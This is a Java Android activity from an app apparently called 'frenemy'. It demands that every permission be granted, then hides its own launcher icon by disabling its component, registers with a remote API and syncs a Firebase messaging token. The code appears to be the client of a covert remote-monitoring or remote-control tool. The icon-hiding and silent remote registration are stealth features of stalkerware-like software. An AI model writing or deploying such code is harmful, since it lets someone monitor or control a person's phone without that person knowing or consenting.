package com.theah64.frenemy.android.activities;


import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

import com.theah64.frenemy.android.R;
import com.theah64.frenemy.android.activities.base.PermissionActivity;
import com.theah64.frenemy.android.asyncs.FCMSynchronizer;
import com.theah64.frenemy.android.models.Frenemy;
import com.theah64.frenemy.android.utils.APIRequestGateway;
import com.theah64.frenemy.android.utils.App;
import com.theah64.frenemy.android.utils.NetworkUtils;
import com.theah64.frenemy.android.utils.PrefUtils;

public class MainActivity extends PermissionActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

    }

    private void doNormalWork() {

        //Hiding app icon
        if (App.IS_DEBUG_MODE) {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }

        if (NetworkUtils.hasNetwork(this)) {

            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey, final String frenemyId) {

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(MainActivity.this, "Connected!", Toast.LENGTH_SHORT).show();
                        }
                    });

                    if (!PrefUtils.getInstance(MainActivity.this).getBoolean(Frenemy.KEY_IS_FCM_SYNCED)) {
                        new FCMSynchronizer(MainActivity.this, apiKey).execute();
                    }
                }

                @Override
                public void onFailed(final String reason) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(MainActivity.this, reason, Toast.LENGTH_SHORT).show();
                        }
                    });
                }
            });

        }

        this.finish();
    }

    @Override
    public void onAllPermissionGranted() {
        doNormalWork();
    }

    @Override
    public void onPermissionDenial() {
        Toast.makeText(this, "All permissions must be accepted", Toast.LENGTH_SHORT).show();
        finish();
    }
}
